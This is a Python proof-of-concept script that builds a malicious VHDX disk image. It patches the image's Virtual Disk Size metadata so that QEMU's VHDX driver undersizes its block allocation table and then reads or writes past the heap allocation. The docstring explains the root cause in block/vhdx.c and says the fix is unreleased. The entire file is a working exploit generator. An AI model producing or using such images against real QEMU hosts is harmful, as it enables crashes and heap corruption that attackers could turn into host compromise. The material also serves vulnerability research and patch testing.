#!/usr/bin/env python3
"""
make_vhdx.py — build a malicious VHDX that triggers QEMU's VHDX BAT
out-of-bounds access (CVE-tracked upstream fix 67198583, unreleased).

Root cause (QEMU block/vhdx.c):
  vhdx_parse_metadata() reads `virtual_disk_size` straight from the image's
  metadata region WITHOUT bounding it to VHDX_MAX_IMAGE_SIZE (64 TiB).
  vhdx_calc_bat_entries() then computes the block count into a *uint32_t*
  `data_blocks_cnt`, so a huge size truncates and the BAT (`s->bat_entries`)
  is undersized relative to `total_sectors`.  vhdx_block_translate() converts
  a guest sector number into a BAT index with NO bounds check, so I/O to a
  high-but-still-valid sector reads/writes `s->bat[bat_idx]` out of bounds.

This script takes a *valid* VHDX (created by `qemu-img create -f vhdx`) and
patches only the "Virtual Disk Size" metadata item to 2^55 + 2^23 bytes
(32 PiB + 8 MiB).  With block_size = 8 MiB that makes:

    data_blocks_cnt = DIV_ROUND_UP(2^55+2^23, 2^23) = 2^32 + 1  -> uint32 == 1
    bat_entries     = 1   (true block count is 2^32+1)

so the BAT has 1 entry while total_sectors ~= 2^46.  Any I/O at an offset
>= 1 TiB (sector >= 2^31) yields bat_idx >= 2^17 > bat_entries and reads past
the BAT heap allocation -> segfault (read) / heap OOB write (write path).

Usage:
    python3 make_vhdx.py <input.vhdx> <output.vhdx>
"""
import struct
import sys

BAT_REGION_GUID = bytes.fromhex("6677c22d23f600429d64115e9bfd4a08")       # 2DC27766-...
METADATA_REGION_GUID = bytes.fromhex("06a27c8b90479a4bb8fe575f050f886e")  # 8B7CA206-...
VIRTUAL_SIZE_GUID = bytes.fromhex("2442a52f1bcd7648b2115dbed83bf4b8")     # 2FA54224-...

# virtual_disk_size = 2^55 + 2^23  (32 PiB + 8 MiB)  -> uint32 block count truncates to 1
MALICIOUS_SIZE = (1 << 55) + (1 << 23)


def find_region_table(data):
    # Region Table 1 is at 192 KiB, Region Table 2 at 256 KiB.
    for base in (0x30000, 0x40000):
        if data[base:base + 4] == b"regi":
            entry_count = struct.unpack_from("<I", data, base + 8)[0]
            return base, entry_count
    raise SystemExit("[-] could not locate a VHDX region table (bad input?)")


def find_region(data, base, entry_count, guid):
    entries = base + 16  # header is 16 bytes
    for i in range(entry_count):
        off = entries + i * 32
        if data[off:off + 16] == guid:
            file_offset = struct.unpack_from("<Q", data, off + 16)[0]
            length = struct.unpack_from("<I", data, off + 24)[0]
            return file_offset, length
    raise SystemExit("[-] requested region GUID not found")


def patch_virtual_size(data, meta_offset):
    if data[meta_offset:meta_offset + 8] != b"metadata":
        raise SystemExit("[-] metadata region signature mismatch")
    entry_count = struct.unpack_from("<H", data, meta_offset + 10)[0]
    entries = meta_offset + 32  # metadata table header is 32 bytes
    for i in range(entry_count):
        off = entries + i * 32
        if data[off:off + 16] == VIRTUAL_SIZE_GUID:
            item_offset = struct.unpack_from("<I", data, off + 16)[0]
            item_length = struct.unpack_from("<I", data, off + 20)[0]
            assert item_length == 8, "unexpected virtual-size item length"
            abs_off = meta_offset + item_offset
            old = struct.unpack_from("<Q", data, abs_off)[0]
            struct.pack_into("<Q", data, abs_off, MALICIOUS_SIZE)
            return abs_off, old
    raise SystemExit("[-] Virtual Disk Size metadata item not found")


def main(argv):
    if len(argv) != 3:
        print(__doc__)
        return 2
    src, dst = argv[1], argv[2]
    with open(src, "rb") as f:
        data = bytearray(f.read())

    base, entry_count = find_region_table(data)
    meta_offset, _ = find_region(data, base, entry_count, METADATA_REGION_GUID)
    abs_off, old_size = patch_virtual_size(data, meta_offset)

    with open(dst, "wb") as f:
        f.write(data)

    print(f"[+] patched Virtual Disk Size at file offset 0x{abs_off:x}")
    print(f"    old virtual size: {old_size} bytes")
    print(f"    new virtual size: {MALICIOUS_SIZE} bytes (32 PiB + 8 MiB)")
    print(f"[+] wrote malicious image -> {dst}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
